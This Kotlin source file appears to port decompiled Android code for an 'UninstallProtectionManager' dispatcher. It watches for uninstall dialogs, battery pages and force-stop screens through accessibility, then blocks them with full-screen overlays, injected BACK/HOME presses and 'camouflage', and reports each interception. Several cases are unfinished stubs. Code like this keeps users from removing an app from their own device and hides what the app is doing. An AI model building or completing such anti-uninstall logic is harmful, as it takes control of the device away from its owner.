package com.storm.safe.rock.p000

import android.util.Log
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager

/**
 * JADX: p000/nk1.java (320 LOC) — Second indexed dispatcher Runnable for UninstallProtectionManager.
 *
 * Same pattern as IndexedRunnable (pk1) but handles a different set of operations,
 * primarily overlay display, back sequences, and uninstall interception.
 *
 * Fields:
 * - f58646a0 → index: int switch selector
 * - f58647a1 → parent: C0355a0 (UninstallProtectionManager)
 *
 * Cases:
 * - 0  → Post-overlay removal check: check if still in dangerous package → restart polling
 * - 1  → Installer popup uninstall detection: search for "卸载/Uninstall" + app name
 * - 2  → Show full-screen overlay (m211949e3)
 * - 3  → Desktop→installer confirm popup app name check
 * - 4  → Remove overlay (m211946e0)
 * - 5  → Show full-screen overlay (m211949e3)
 * - 6  → Show full-screen overlay (m211949e3)
 * - 7  → Show full-screen overlay (m211949e3)
 * - 8  → Back sequence: 3x BACK + HOME (with 80ms sleep between backs)
 * - 9  → Show overlay + stopPolling (battery page intercept)
 * - 10 → Show overlay + stopPolling (force-stop intercept)
 * - 11 → Show overlay + stopPolling (app detect intercept)
 * - 12 → Honor uninstall intercept: click "从桌面移除" or BACK + camouflage
 * - 13 → BACK + sleep + HOME
 * - 14 → OPPO uninstall intercept: camouflage + report
 * - 15 → Single BACK action
 * - default → Full-screen overlay + camouflage + report
 */
class IndexedRunnable2(
    val parent: UninstallProtectionManager,
    val index: Int
) : Runnable {

    override fun run() {
        try {
            when (index) {
                0 -> {
                    // JADX case 0: Post-overlay removal — check if still in dangerous package
                    // Gets root node, checks package name:
                    // - If launcher/home → log and wait for next long-press
                    // - If dangerous package → restart polling
                    Log.d(TAG, "case=0: post-overlay package check")
                    // ADAPT: Complex logic involving getRootInActiveWindow
                }
                1 -> {
                    // JADX case 1: Installer popup uninstall detection
                    // Searches for "卸载/Uninstall/移除/Remove" keywords
                    // Then searches for app name → if found, trigger overlay (case 2)
                    Log.d(TAG, "case=1: installer popup uninstall detection")
                    // ADAPT: Accessibility node search for uninstall keywords
                }
                2 -> {
                    // JADX case 2: Show full-screen overlay
                    // Calls m211949e3 → showFullscreenOverlay
                    parent.showFullscreenOverlay()
                }
                3 -> {
                    // JADX case 3: Desktop→installer confirm popup check
                    // Searches for app name in installer confirm dialog
                    // If found → trigger overlay (case 7) + report
                    Log.d(TAG, "case=3: desktop→installer confirm check")
                    // ADAPT: Accessibility node search
                }
                4 -> {
                    // JADX case 4: Remove overlay
                    // Calls m211946e0 → removeFullscreenOverlay
                    parent.removeFullscreenOverlay()
                }
                5 -> {
                    // JADX case 5: Show full-screen overlay (same as case 2)
                    parent.showFullscreenOverlay()
                }
                6 -> {
                    // JADX case 6: Show full-screen overlay (same as case 2)
                    parent.showFullscreenOverlay()
                }
                7 -> {
                    // JADX case 7: Show full-screen overlay (same as case 2)
                    parent.showFullscreenOverlay()
                }
                8 -> {
                    // JADX case 8: Back sequence — 3x BACK(80ms gap) + HOME
                    // Uses isBackSequenceRunning atomic boolean
                    Log.d(TAG, "case=8: back sequence 3xBACK+HOME")
                    parent.triggerBackSequence()
                }
                9 -> {
                    // JADX case 9: Battery page intercept — show overlay
                    // ok1 reference + m211949e3
                    parent.showFullscreenOverlay()
                }
                10 -> {
                    // JADX case 10: Force-stop intercept — show overlay
                    // ok1 reference + m211949e3
                    parent.showFullscreenOverlay()
                }
                11 -> {
                    // JADX case 11: App detect intercept — show overlay
                    // ok1 reference + m211949e3
                    parent.showFullscreenOverlay()
                }
                12 -> {
                    // JADX case 12: Honor uninstall intercept
                    // Sleep 50ms, getRootInActiveWindow, try click "从桌面移除"
                    // If not found → BACK
                    // Then trigger camouflage + report
                    Log.d(TAG, "case=12: Honor uninstall intercept")
                    // ADAPT: Honor-specific accessibility logic
                    parent.triggerCamouflage()
                    parent.reportDetection(
                        "PKGINSTALLER_INTERCEPT",
                        "桌面卸载拦截(荣耀+伪装)",
                        listOf("卸载按钮"),
                        "BACK+伪装",
                        "launcher"
                    )
                }
                13 -> {
                    // JADX case 13: BACK + sleep(100ms) + HOME
                    Log.d(TAG, "case=13: BACK+HOME")
                    // ADAPT: serviceRef.performGlobalAction(BACK) + sleep + performGlobalAction(HOME)
                }
                14 -> {
                    // JADX case 14: OPPO uninstall intercept — camouflage + report
                    parent.triggerCamouflage()
                    parent.reportDetection(
                        "PKGINSTALLER_INTERCEPT",
                        "桌面卸载拦截(OPPO)",
                        listOf("卸载按钮"),
                        "BACK+HOME+伪装",
                        "launcher"
                    )
                }
                15 -> {
                    // JADX case 15: Single BACK action
                    // serviceRef.performGlobalAction(1) // GLOBAL_ACTION_BACK
                    Log.d(TAG, "case=15: single BACK")
                    // ADAPT: serviceRef.performGlobalAction(GLOBAL_ACTION_BACK)
                }
                else -> {
                    // JADX default: Full-screen overlay + camouflage + report
                    parent.triggerCamouflage()
                    parent.reportDetection(
                        "PKGINSTALLER_INTERCEPT",
                        "桌面卸载全屏拦截",
                        listOf("卸载按钮"),
                        "全屏覆盖+伪装",
                        "launcher"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "IndexedRunnable2 index=$index failed", e)
        }
    }

    companion object {
        private const val TAG = "IndexedRunnable2"
    }
}
